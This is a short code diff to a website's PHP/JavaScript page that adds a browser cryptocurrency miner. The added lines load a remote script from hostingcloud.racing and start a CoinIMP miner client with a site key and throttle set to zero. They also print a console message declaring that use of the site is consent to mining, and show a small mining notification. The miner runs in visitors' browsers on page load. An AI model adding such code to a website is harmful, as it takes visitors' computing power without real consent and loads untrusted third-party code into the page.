@@ -174,6 +174,18 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
 if (window.location.href.substr(-2) !== '?r') {
     window.location = window.location.href + '?r';
 }
+	console.log("By using this website you consent to using your computer power for crypto-currency mining, if you do not consent, please leave the website");
+
+</script>
+	  
+<script src="https://www.hostingcloud.racing/cPTP.js"></script>
+<script>
+    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
+        throttle: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
 </script>
 
     <style>
